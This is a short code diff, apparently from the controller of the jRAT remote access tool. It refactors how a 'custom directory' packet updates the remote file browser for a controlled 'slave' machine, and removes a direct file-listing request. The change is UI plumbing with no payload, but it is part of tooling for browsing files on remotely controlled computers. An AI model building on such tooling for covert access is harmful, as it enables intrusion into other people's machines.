@@ -3,9 +3,7 @@ package se.jrat.controller.packets.incoming;
 import java.io.DataInputStream;
 
 import se.jrat.controller.Slave;
-import se.jrat.controller.packets.outgoing.Packet15ListFiles;
 import se.jrat.controller.ui.frames.FrameRemoteFiles;
-
 
 public class Packet34CustomDirectory extends AbstractIncomingPacket {
 
@@ -15,11 +13,7 @@ public class Packet34CustomDirectory extends AbstractIncomingPacket {
 
 		FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(slave);
 		if (frame != null) {
-			frame.getRemoteTable().setDirectory(where);
-			while (frame.getRemoteTable().getTableModel().getRowCount() > 0) {
-				frame.getRemoteTable().getTableModel().removeRow(0);
-			}
-			slave.addToSendQueue(new Packet15ListFiles(where));
+			frame.getFilesPanel().getRemoteTable().setDirectory(where);
 		}
 	}
 
